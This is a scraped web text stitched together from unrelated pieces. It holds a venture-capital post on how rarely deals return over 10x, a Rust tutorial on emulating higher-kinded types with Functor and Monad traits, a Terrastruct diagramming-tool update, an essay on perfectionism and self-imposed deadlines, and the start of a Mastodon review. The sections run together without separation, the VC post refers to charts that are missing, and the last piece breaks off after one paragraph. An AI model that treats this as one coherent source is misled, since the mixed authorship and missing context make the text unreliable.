<p><em>This post originally appeared on Seth’s blog.</em></p>



<p>Some of the most popular posts I’ve written over the past couple of years were the two that focused on just how rare outsized returns for an individual deal are in venture capital. You can see the original posts <a rel="noreferrer noopener" href="https://sethlevine.com/archives/2014/08/venture-outcomes-are-even-more-skewed-than-you-think.html" target="_blank">here</a> and <a href="https://www.sethlevine.com/archives/2019/09/the-markets-are-great-but-venture-outcomes-havent-changed-much.html">here</a>. In those posts I was analyzing data from Correlation Ventures that showed just how skewed venture returns are, specifically that <strong>65% of investment rounds fail to return 1x capital and only 4% return greater than 10x capital</strong>.</p>

<p>Ian Hathaway, who recently co-authored the second edition of <a rel="noreferrer noopener" href="https://www.amazon.com/Startup-Communities-Building-Entrepreneurial-Ecosystem/dp/1119617650/ref=asc_df_1119617650/?tag=hyprod-20&amp;linkCode=df0&amp;hvadid=459726176530&amp;hvpos=&amp;hvnetw=g&amp;hvrand=9536524533228269419&amp;hvpone=&amp;hvptwo=&amp;hvqmt=&amp;hvdev=c&amp;hvdvcmdl=&amp;hvlocint=&amp;hvlocphy=9001941&amp;hvtargid=pla-930155281111&amp;psc=1" target="_blank">Startup Communities</a> with my partner, Brad, sent me the chart below, which highlights how that translates to returns in venture capital as an asset class. I’ve seen versions of this chart before, and while it’s not surprising it is always jarring to see it laid out like this. Specifically, the difference between the best performing and average performing firms are incredibly wide. Venture is a hits business and if you think about a typical venture fund of almost any size having somewhere between 25 – 40 investments, the chances of any one of those investments being a true outlier and returning a multiple of the fund are quite small. In order to have a successful fund, it’s almost a requirement that you have an outlier return for at least one of your investments (see below the chart for the math).</p>

<p>Some quick math highlights why this is the case. For example, assume a $100M fund with 30 investments. That’s a little over $3M per investment, and while there is some dispersion from the average across companies in a fund, it’s not a bad way to model it. But from the outcomes chart above (the first one) we know that on average only 1 (actually just fewer than 1) company in that group of 30 will return between 10x and 20x. And less than 1 will return 20x or greater (I’m using the company averages, the dollar averages are on a per round basis, which would make these numbers even worse). A 20x returner for a fund that on average invests $3-$3.5M in a company doesn’t return that fund. Taking the most aggressive end of these numbers would still only have this one company returning 70% of the fund’s capital. If you were going to have several of these, of course, that would work out for your fund. IRR will depend on the timing of cash flows but as a quick rule of thumb, venture funds look to return at least 3 times the invested capital – after fees, so more like 3.5x on a gross basis. That’s pretty hard to do without a true outlier return (50x+) and/or consistency of 10x+ returns that is simply hard to generate. And here’s where the dispersion comes in. The best funds do have multiple companies that return in that range. Or higher. But that means the median fund doesn’t have any. And that is why the average venture fund isn’t actually a particularly good investment and also why so many venture funds fail to return capital.</p>



<p>I thought about this a couple of years ago when <a href="https://www.sethlevine.com/archives/2018/04/whats-the-optimal-portfolio-strategy-for-a-venture-fund.html">I wrote about the optimal venture fund strategy</a> and my conclusion was that venture firms should place more bets and have more exposure across a larger set of businesses. Obviously, those inside the industry argue that managers who are good at picking businesses would do better to own more of fewer businesses if they can show that they have the aptitude to invest in those that become true outliers. But given how rare they are, I wonder if that is arguably the optimal strategy. As David Cohen replied once years ago when I asked him what the key to being a successful venture capitalist was: “Luck”.</p>

  <div itemprop="articleBody">
    <p>Do you want to use Higher Kinded Types (<code>HKT</code>) in Rust? Are you tired of waiting for <code>GAT</code>? Well, this is the place to be.</p>

<p>It’s easiest to understand <code>HKT</code> by analogy. In programming we have many different tiers of abstractions. Starting at the bottom we have <code>term</code>s (aka values) like <code>0</code>, <code>true</code>, <code>"hello world!"</code>. If we want to work with a lot of <code>term</code>s that share a property, we use <code>type</code>s. For example, if we want to work with …</p>

<ul>
  <li>32-bit integer, we use <code>i32</code></li>
  <li>utf-8 strings, we use <code>&amp;str</code> or <code>String</code></li>
</ul>

<p>We generally use snake case to refer to <code>term</code>s generically like <code>x</code>, <code>im_an_integer</code>, and <code>database_connection</code>. We use functions to operate on these generic values.</p>

<div><div><pre><code><span>fn</span> <span>add_one</span><span>(</span>
    <span>// a generic 32-bit integer</span>
    <span>x</span><span>:</span> <span>i32</span>
<span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span> <span>x</span> <span>+</span> <span>1</span> <span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers, we come to <code>type</code>s. For example: <code>String</code>, <code>i32</code>, or <code>bool</code>. If we want to work with a lot of <code>type</code>s that share a property, we use <code>trait</code>s and generics. For example, if we want to work with …</p>

<ul>
  <li>types that can be debug printed, we use <code>std::fmt::Debug</code></li>
  <li>types that can be iterated, we use <code>Iterator</code></li>
</ul>

<p>We generally use pascal case to refer to <code>types</code>s generically like <code>T</code>, <code>Self</code>, and <code>This</code>. We use generic functions to work with these generic types.</p>

<div><div><pre><code><span>fn</span> <span>print</span><span>&lt;</span><span>T</span><span>:</span> <span>Debug</span><span>&gt;</span><span>(</span><span>x</span><span>:</span> <span>T</span><span>)</span> <span>{</span>
    <span>println!</span><span>(</span><span>"{:?}"</span><span>,</span> <span>x</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Moving up the abstraction tiers again, we come to <code>kind</code>s. For example: <code>Option</code>, <code>Result</code>, or <code>Vec</code>. Wait what. Let’s take a step back. Before I mentioned that <code>String</code>, <code>i32</code>, and <code>bool</code> are types. We also have more types that we can use, generic types like <code>Option&lt;i32&gt;</code> or <code>Result&lt;String, String&gt;</code>. What if you want to generalize over these types? Something of the form <code>T&lt;U&gt;</code>. That’s where we get to kinds. For example:</p>

<ul>
  <li><code>i32</code> has the kind <code>Type</code></li>
  <li><code>Option&lt;i32&gt;</code> has the kind <code>Type</code></li>
  <li><code>'a</code> has the kind <code>Lifetime</code></li>
  <li><code>Option</code> has the kind <code>Type -&gt; Type</code>
    <ul>
      <li>W H A T, let’s stop and explain what’s going on here</li>
    </ul>
  </li>
</ul>

<p>Generic types can be represented as a function from kinds to kinds. For example, <code>Option</code> is a function that takes a <code>Type</code> and produces a <code>Type</code> (hence <code>Type -&gt; Type</code>). Let’s see some more examples:</p>

<ul>
  <li><code>Result</code> has the kind <code>Type -&gt; Type -&gt; Type</code>
    <ul>
      <li>I’ll use this notation because that’s how it’s done in the literature</li>
      <li>Note: this is equivalent to <code>(Type, Type) -&gt; Type</code> (you can always transform a function that take a tuple of arguments into one that takes multiple arguments, and vice versa)</li>
    </ul>
  </li>
  <li>references have a kind <code>Lifetime -&gt; Type -&gt; Type</code>
    <ul>
      <li><code>&amp;'a T</code>, one lifetime and one type parameter :)</li>
    </ul>
  </li>
  <li>arrays have the kind <code>Type -&gt; usize -&gt; Type</code>
    <ul>
      <li><code>[T; len]</code>, one type and one <code>usize</code> <code>term</code> (getting close to dependent types, something we won’t touch in this post)</li>
    </ul>
  </li>
</ul>

<p>With this notion of <code>kind</code>s we are now well equipped to generalize over generics. Just one cinch, <code>Rust</code> doesn’t know about <code>kind</code>s! So how do we generalize over generics if we can’t even express the fundamental building blocks.</p>



<p>The key insight is that we can represent <code>kind</code>s as a system of types and traits. For example, here’s how to handle <code>Type -&gt; Type</code> kinds.</p>

<p>Note: I’ll show how <code>Option</code> fits in, and introduce <code>Result&lt;_, E&gt;</code>, but I’ll leave the implementation of <code>Vec</code> to you. It’s an interesting puzzle if you are inclined</p>

<div><div><pre><code><span>// `Option` has the kind `Type -&gt; Type`,</span>
<span>// we'll represent it with `OptionFamily`</span>
<span>struct</span> <span>OptionFamily</span><span>;</span>
<span>// `Result` has the kind `Type -&gt; Type -&gt; Type`,</span>
<span>// so we fill in one of the types with a concrete one</span>
<span>struct</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span><span>(</span><span>PhantomData</span><span>&lt;</span><span>E</span><span>&gt;</span><span>);</span>

<span>// I'll leave the implementation of `VecFamily` to you</span>

<span>// This trait represents the `kind` `Type -&gt; Type`</span>
<span>pub</span> <span>trait</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>{</span>
    <span>// This represents the output of the function `Type -&gt; Type`</span>
    <span>// for a specific argument `A`.</span>
    <span>type</span> <span>This</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>// `OptionFamily` represents `Type -&gt; Type`,</span>
    <span>// so filling in the first argument means</span>
    <span>// `Option&lt;A&gt;`</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>;</span>
<span>}</span>

<span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>for</span> <span>ResultFamily</span><span>&lt;</span><span>E</span><span>&gt;</span> <span>{</span>
    <span>// note how all results in this family have `E` as the error type</span>
    <span>// This is similar to how currying works in functional languages</span>
    <span>type</span> <span>This</span> <span>=</span> <span>Result</span><span>&lt;</span><span>A</span><span>,</span> <span>E</span><span>&gt;</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Note how a <code>trait</code> can act as a function over types, so you can encode the idea <code>Type -&gt; Type</code> using a trait!</p>

<p>Let’s also introduce a type alias for ease of use.</p>

<div><div><pre><code><span>// Option&lt;A&gt; == This&lt;OptionFamily, A&gt;</span>
<span>pub</span> <span>type</span> <span>This</span><span>&lt;</span><span>T</span><span>,</span> <span>A</span><span>&gt;</span> <span>=</span> <span>&lt;</span><span>T</span> <span>as</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;&gt;</span><span>::</span><span>This</span><span>;</span>
</code></pre></div></div>

<p>Now we can replace all usage of <code>Option</code>, <code>Result&lt;_, E&gt;</code> with <code>OptionFamily</code> or <code>ResultFamily&lt;E&gt;</code>! From this we can build up abstractions that “require” HKT. Let’s start with the simplest abstraction <code>Functor</code>. This is just any <code>Type -&gt; Type</code> that has a notion of mapping a value. Generally <code>Functor</code> represents a collection, but it can do much more than that (But I won’t dive into <code>Functor</code> in particular in this post).</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is quite a lot, so let’s soak it in.</p>

<div><div><pre><code><span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span>
</code></pre></div></div>

<p>First, we require that our families can be used with either type. This allows you to restrict the families in some ways, for example for <code>HashSet</code>, only allow <code>T: Hash + Eq</code>. <code>A</code> will be the input type, and <code>B</code> will be the output type.</p>

<div><div><pre><code><span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>Next we have this monstrous function! This will be easier to explain if we have a concrete family.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>So this is just the same as the ordinary map in <code>Option</code>, except it requires <code>Fn</code>, instead of <code>FnOnce</code>. We could generalize over <code>Fn</code> and <code>FnOnce</code> if Rust had associated traits, but alas we don’t, so we’ll have to make do with <code>Fn</code> (I’ll leave it to you to figure out a nice way to abstract over <code>Fn</code>, <code>FnMut</code> and <code>FnOnce</code>). All we’ve done is generalize it to <em>any</em> family, not just <code>Option</code>.</p>

<p>The <code>Copy</code> bound is nice for things like <code>Vec</code> where you need to apply the function multiple times. You can convert any <code>Fn</code> to a <code>Fn + Copy</code> because <code>&amp;_</code> implement <code>Fn</code> and are <code>Copy</code>.</p>

<p>So all together again:</p>

<div><div><pre><code><span>trait</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>OneTypeParam</span><span>&lt;</span><span>A</span><span>&gt;</span> <span>+</span> <span>OneTypeParam</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p><code>Functor</code> just specifies a mapping operation. We can implement this rather easily.</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>map</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>B</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// I'm not cheating!</span>
        <span>this</span><span>.map</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>Ok, but that’s boring, I hear you say. What about <code>Monad</code>? Typically it’s defined by it’s <code>bind</code> operation (We’ll skip <code>Applicative</code> here, try it out yourself!). I’m not going to explain how <code>Monad</code> works, or why you would want it, just how to implement it.</p>

<div><div><pre><code><span>trait</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span><span>:</span> <span>Functor</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Looks the same as <code>Functor</code> to me! … Wait, the bound on <code>F</code> looks funky. Let’s dig in to the <code>OptionFamily</code> implementation again, maybe that will clear things up.</p>

<div><div><pre><code><span>/// for `OptionFamily`</span>
<span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>a</span><span>:</span> <span>Option</span><span>&lt;</span><span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span>
<span>where</span>
    <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>Option</span><span>&lt;</span><span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span><span>;</span>
</code></pre></div></div>

<p>This looks very familiar, … where have I seen this before? <code>Option::and_then</code> is that you?</p>

<div><div><pre><code><span>impl</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>Monad</span><span>&lt;</span><span>A</span><span>,</span> <span>B</span><span>&gt;</span> <span>for</span> <span>OptionFamily</span> <span>{</span>
    <span>fn</span> <span>bind</span><span>&lt;</span><span>F</span><span>&gt;</span><span>(</span><span>self</span><span>,</span> <span>this</span><span>:</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>A</span><span>&gt;</span><span>,</span> <span>f</span><span>:</span> <span>F</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span>
    <span>where</span>
        <span>F</span><span>:</span> <span>Fn</span><span>(</span><span>A</span><span>)</span> <span>-&gt;</span> <span>This</span><span>&lt;</span><span>Self</span><span>,</span> <span>B</span><span>&gt;</span> <span>+</span> <span>Copy</span> <span>{</span>
        <span>// It fits 😉</span>
        <span>this</span><span>.and_then</span><span>(</span><span>f</span><span>)</span>
    <span>}</span>
<span>}</span>

<span>// try out `VecFamily`, it doesn't need to be optimal, it just needs to work!</span>
</code></pre></div></div>

<p>In this way you can implement most, if not all <code>HKT</code> abstractions in stable Rust. However the ergonomics of these abstractions are downright abysmal. Bounds, bounds, bounds <em>everywhere</em>. We saw this a little in <code>Functor&lt;A, B&gt;</code>, we needed <code>OneTypeParam&lt;A&gt; + OneTypeParam&lt;B&gt;</code> (why does family need to be repeated!). Hopefully we can solve this on nightly, find out next time …</p>

      <p>Terrastruct launched on January 5, 2020 [0] to address a hole in developer tools – a diagramming tool that was made for developers. The popular choice to create software architecture diagrams is with general-purpose tools. The problem is that often, when trying to map this intricate, layered model of the architecture that engineers have in their heads to a static image, it gets very messy, unsuitable as documentation or even presentation. The alternative is that they try to keep it clean by removing critical details and cutting non-essential edge case flows. But the details and handling edge cases are the core of what an architecture is meant to convey.</p>

<p>Instead, Terrastruct is designed to handle complexity by breaking a diagram apart. Each layer maps to layers of abstractions, and there’s room to define individual scenarios to describe every sequence of events or edge cases as needed. The tooling makes it easy to create these sorts of diagrams, and the presentation has intuitive navigation to view them. [1]</p>

<p>Now, after a year of iterating from the initial launch, Terrastruct is now “1.0”. It’s stable, and people <em>enjoy</em> diagramming on it. Hundreds of software architecture diagrams are created and shared every week, by individual developers, teams, and organizations. And they’re diagrams that are only possible on Terrastruct.</p>

<p>The next big initiatives:</p>
<ol>
  <li>Adding a data layer, and feed real data directly into diagrams</li>
  <li>Intelligently generate diagrams where possible</li>
</ol>

<h3 id="data-in-diagrams">Data in diagrams</h3>
<p>The idea here is that one of the main use cases for diagrams is documenting systems. But a static snapshot of systems is too detached from the actual, and is likely to drift as updates are made to the system. Finding areas where real data can be used integrates the diagram as part of your infrastructure, or at least an artifact of it.</p>

<p>This also essentially lets engineers <em>design</em> the layout of their analytics/metrics. Instead of using charts in a grid, the spatial orientation of elements with labels and shapes and colors gives context to the data.</p>

<p>For example, a server’s color reflects the reading of its last health check. A connection label gives the reading of current pending requests for each service. CPU readings are shown for each one of your servers. With Terrastruct’s layers, if you see a spike in CPU on a server, you can sleuth in a much more intuitive manner by clicking through into that server’s layout, and the readings of various processes.</p>

</div>

<h3 id="intelligent-generation">Intelligent generation</h3>
<p>As much as possible, we want to move away from the manual labor of dragging and dropping to create diagrams.</p>

<p>By using text to define diagrams, it should be possible to get at least 80% of the way towards the final product. I think the perfect diagram still requires human intervention to tweak the result of the autolayout algorithm [1]. Graphviz is currently the most used tool for auto-generating diagrams, but results won’t meet aesthetic criterias to put on blog posts. Tree-based and force-directed algorithms are only suitable for niche use cases. Most algorithms don’t handle containers, even though that’s extremely common in software architecture diagrams. We have a beta of an algorithm that gives aesthetically pleasing results, but it can be more consistent, and handle more cases.</p>

<p>Aside from faster diagramming, Terrastruct should allow automatically generating diagrams from sources that are suitable for such. The low-hanging fruit is database schemas. Make changes to your database schema, and a diagram of the relations should be generated, with links of dependencies. Some others to aim for are infrastructure – reading AWS accounts and Terraform modules to produce a diagram of infrastructure – and even source code itself – trace dependencies or function calls.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				












<h2>Background</h2>



<p>You would think that starting or sustaining at anything is hard enough, right? But once you do start and once you do keep doing it, assuming that there’s an actual end to it, you’d expect it to be easy, no? Since you overcame the static friction and (hopefully) managed to do it for long enough to bring it to closure, finalizing the thing (whatever the thing is) should be a no brainer, right?</p>



<p>WRONG! </p>



<p>I can tell you, firsthand, that you are so damn wrong. Doubly so if you are somewhere high on the perfectionist spectrum.</p>



<p>Finishing a task, finalizing a project or wrapping up your bachelor thesis – they all come with specific set of issues. And this article is all about tackling them.</p>



<h2>Real-life story</h2>



<p>I finished all my exams and was discussing with my mentor which subject to tackle for my thesis work. Everything run by so fast and I just felt like I never gave my 100%. I did pretty good overall but I just felt like I never demonstrated my best. This was a time to make up for that.</p>



<p>“How much time do I actually have to submit this thesis?”. It was around late February.</p>



<p>“Well, the latest you have is by October, but I’d strongly suggest you to aim for June. No need to drag it any further than that”.</p>



<p>Almost eight months in worst case. Hell, even if I wrote half a page a day, I could tackle this in three months. EASILY.</p>



<p>Now, you have to understand that, by being a perfectionist and if you’re reading this – you probably are one, <span>you tend to categorize tasks in two categories — ULTRA IMPORTANT or NOT IMPORTANT AT ALL</span>. The latter ones are fine – you probably don’t need this article to have those tackled. But the ones that you categorize as ULTRA IMPORTANT, well hell’s bells, <span>unless you apply some tools of the trade, those tasks are doomed to last FOREVER</span>.</p>



<p>Needless to say in which category did my thesis end up, right? It was my personal work of art, expressed by letters being grouped into words. Every chapter would be a mind blowing one. Every comma had a pure holistic reasoning behind it. It was my terrestrial legacy to all of the readers and all future generations to come.</p>



<p>Two months and, I kid you not, all I had was a title. Well, a rather good one I should say – “Using audio-fingerprinting technique for the purpose of identification and categorization of an audio sample”. But still, it’s ALL I had in TWO months. And it wasn’t even written in a required format, but rather hanging in my notes app. At least it ticked all of my shitboxes – it sounded holistic and I’m sure the academia would fall over it’s butt once I released it to wilderness …</p>



<p>“Okay”, I thought, “at least I have a month to wrap it up. I can do two pages a day or so and I’ll be good to go”. What a dumb-ass thinking it was …</p>



<p>I’d like to say that it took me a month to finish, but that’d be a lie. It took me seven months and twenty eight days of randomly writing thoughts here and there, widening and narrowing down all the topics that I’d love to cover … And the clock was actively working against me. The paranoia started kicking in. Frankly, I probably would never even have finished it if it wasn’t for my professor who contacted me in late September to tell me that I have two days to deliver a finished and printed version. He loved the progress and he approved everything that I covered so far, but he needed it finished. F*ck!</p>



<p>Not only did I finish the whole thesis in 48 hours (I was literally writing the day and night; the only time when I wasn’t writing was during the 8 hours when I had work to attend to), but it turned out pretty good! Probably not how I envisioned it, but regardless. And I liked it.</p>



<p>Now, I would love to say that I learned my lesson here and that my master thesis took a different course. Not exactly. However, I’ve learned a trick – <span>I wrote the intro and conclusion before I wrote the middle part</span>. Combined with a fixed deadline, it actually did wonders. And I’ll elaborate on that now …</p>



<h2>The “Life’s Work” problem</h2>



<p>You know, I’m not exactly sure if this is just my problem or a rather generic one. I would bet on the latter.</p>



<p><span>Be it a thesis, a short-term task or a whole project that you are working on, we tend to believe that it just has to be perfect. Good enough is not good enough</span>. But, why so?</p>



<p>I can’t speak for everyone, but when it comes to me, I actually think that I’m afraid of being judged. Especially for something that I do care about. I’m afraid that someone is going to look at what I did and just be like “meh, it’s okay”, or “meh, it could have been better”. The sheer thought of that scares the living shit out of me.</p>



<p>Obviously, the only way of preventing someone from judging you (yes, YOU!) is to make it your life’s work. Pour all time and energy into it, trying to make it perfect.</p>



<p>And you know what’s the problem with “life’s work”? You either drop dead before you’re finished, or you give up on it. But one thing is guaranteed – they take shitload of time and you probably miss bunch of other opportunities in the process. Worst of all? <span>Once you do do finish (assuming that you do so), and once the initial excitement wears of, you realize that it wasn’t even that important in the first place</span>. It becomes yet another “meh, it’s okay” on your shelf. And you move on, determined not to repeat the same mistake again.</p>



<h2>Deadline as a medium of creative drive</h2>



<p>You know, I’m a programmer. And I’ve been so my whole life. And <span>if there is ONE thing that is guaranteed to trigger my vomit reflex it has to be the mention of a “deadline”</span>. Seriously.</p>



<p>Yet, <span>I would lie if I told you that there’s been anything remotely more efficient than having a fixed deadline</span>. The date when you have to have your project finished, or the date when you have to turn your homework or thesis in.</p>



<p>You would assume that NOT having a deadline is a proper way to fire up your creative juices, right? Because, putting a TIMELINE on a creative work beats the purpose of creativity, right? </p>



<p>Wrong. Partially, at least.</p>



<p>If you haven’t done so already, I’d strongly suggest you go and read <a href="https://www.goodreads.com/book/show/18077903-creativity-inc?ac=1&amp;from_search=true&amp;qid=UIM1mGMSpj&amp;rank=1" target="_blank" rel="noreferrer noopener">Creativity, Inc</a>. It’s written by Ed Catmull, a guy who happens to be a brain behind 3D graphics and many of the Pixar’s cartoons. He also happens to be a President of Disney’s animation studio. </p>



<p>He argues that the deadlines are THE BEST way to bring your creativity to anything that is useful. Like, you know, a Toy Story for example. And how so? Well, by treating it as a medium, and not as a whip. You set a deadline for a check-up, but you don’t threaten people with being beaten if they miss it. You have people commit to deliver SOMETHING by the fixed date and then you decide how to proceed. Rinse &amp; repeat until it’s perfect!</p>



<p><span>But, what do you do if you DON’T have a fixed deadline (e.g. you’re working on your personal pet project, like, a blog post for example)? Well, you MAKE one</span>! And just to ensure that you do have actual stakeholders waiting for the “outcome”, you make a public commitment!</p>



<h2>Public Commitment as a viable alternative</h2>



<p>If you’ve been following my “work” on Instagram or LinkedIn, you probably have noticed that I usually publish a screenshot of the new article that I’m starting to work on. And you might have been wondering, and rightfully so, WHY am I doing that? What’s the purpose of publishing a screenshot of an unpublished article?</p>



<p>That is my public commitment! That is how I make an artificial deadline and how I make you a stakeholder. By publishing the screenshot, I’m passively announcing that I’m working on something new and that you should expect the final version soon. And there it is. My artificial 5-days deadline is set and my creative juices are on fire now!</p>



<p><span>So, in case that you want to work on ANYTHING that doesn’t have a strong deadline, go and make one</span>! If you’re about to embark on a diet – announce that you are planning to “lose X kilograms by …..”. If you’re working on a task, tell your boss that you will be finished by next week. Or, if you’re about to start blogging … well, announce it! Make your public commitment and then, the only thing that you’ll be left with is – having to do it 🙂 Because, you wouldn’t want to be a liar, wouldn’t you? 🙂</p>



<h2>Your turn!</h2>



<p>Whatever it is that you are working on (or planning to do), go and announce WHEN will it be finished! Make a PUBLIC COMMITMENT. Make artificial stakeholders.</p>



<p><strong>You don’t have to make it PUBLIC PUBLIC</strong> though. Sharing it with your inner circle, your family or, you know, your boss, is absolutely OK as well. <span>What’s important is that<strong> you commit to at least one person </strong>and that person has to keep you accountable</span>!</p>



<p>I guarantee that once you scratch the power that lies under the surface of public commitment, you’ll have hard time NOT finishing anything ever again!</p>



<h2>Conclusion</h2>



<p>Be it a task, a project, a thesis or a general goal that you want to achieve, putting end to what you started is as complex as starting and sustaining at it is. Combined with a “life’s work” problem where we tend to categorize things as ultimate expression of our creativity and skilfulness, we have a perfect recipe for a never-ending crusade.</p>



<p>One of the best ways to tackle this is a battle tested method of a deadline and commitment. Commit yourself either to your best friend or by announcing it publicly, and do make sure to create stakeholders and set expectations. This, in turn, will be one of the best driving forces both to keep you on track of what matters and to ensure that you are actually going to close.</p>



<p>Good luck and let me know how you did!</p>



<h2>Useful resources</h2>



<p>Unfortunately, I don’t have that many resources directly related to the subject of “finishing” things. Hence, I will recommend some of the things that, among other things, tackle some of the topics that I wrote about:</p>



<ul><li>Creativity, Inc. by Ed Catmull – it’s not a self-help book but it deals with the topic of creativity and how Pixar achieved it. You’ll get to …</li></ul></div></div>

February 19, 2021 | https://raccoon.onyxbits.de/blog/mastodon-social-network-review/ | <a href="https://web.archive.org/web/*/https://raccoon.onyxbits.de/blog/mastodon-social-network-review/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>I have a problem with this blog. It used to be powered by Wordpress, but the <bbr title="Content Management System">CMS pissed me off without end over the years, so I migrated to Hugo. That fixed a lot of the problems, except the main one: it is still (mostly) a Wordpress style blog, in which posts are fat content pieces of content, consisting of a  title and at least one paragraph of text. This is utterly unsuitable for things like posting status updates or sharing thoughts. Twitter does way better here, but it’s a proprietary platform, I’m not willing to bind myself to.</bbr></p>

